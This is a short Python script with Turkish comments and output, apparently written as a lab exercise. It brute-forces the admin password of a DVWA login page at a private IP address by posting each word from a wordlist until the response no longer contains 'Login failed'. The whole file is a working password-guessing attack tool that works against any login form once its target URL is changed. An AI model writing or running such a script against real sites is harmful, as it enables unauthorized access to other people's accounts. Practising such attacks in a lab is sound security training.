#!usr/bin/env python
# -*- coding: utf-8 -*-


# ==============================================================================
# title           :   dictionaryAtack.py                                       #
# description     :   Bir hedef web sitesi veya ip adresine giriş için sözlük saldırısı yapan bir script.
# date            :   30/06/2019                                               #
# version         :   1.0                                                      #
# author          :   Mustafa Dalga                                            #
# linkedin        :   https://www.linkedin.com/in/mustafadalga                 #
# github          :   https://github.com/mustafadalga                          #
# email           :   mustafadalgaa<at>gmail[.]com                             #
# usage           :   python dictionaryAtack.py                                #
# python_version  :   3.7.2                                                    #
# ==============================================================================

from termcolor import colored
try:
    import requests
except KeyboardInterrupt:
    print(colored("\n[-] CTRL+C basıldı.", "red"))
    print(colored("[-] Uygulamadan çıkış yapıldı!", "red"))
    exit()

class DictionaryAtack():
    def __init__(self):
        self.hedef = "http://10.0.2.6/dvwa/login.php"
        self.data = {"username": "admin", "password": "", "Login": "Login"}
        self.wordlist="password.txt"


    def atack(self):
        with open(self.wordlist, "r") as wordlist:
            for line in wordlist:
                word = line.strip()
                self.data["password"] = word
                response = requests.post(self.hedef, data=self.data)
                print(colored("\r[*] Parola deneniyor:"+word,"blue"),end="")
                if "Login failed" not in str(response.content):
                    print(colored("\n[+] Parola bulundu --> ","green") + word)
                    exit()

    def uyari(self):
        print(colored("[-] Bütün parolalar denendi.","red"))
        print(colored("[-] Parola bulunamadı","red"))


try:
    dict_atack=DictionaryAtack()
    dict_atack.atack()
    dict_atack.uyari()
except KeyboardInterrupt:
    print(colored("\n[-] CTRL+C basıldı.", "red"))
    print(colored("[-] Uygulamadan çıkış yapıldı!", "red"))
    exit()
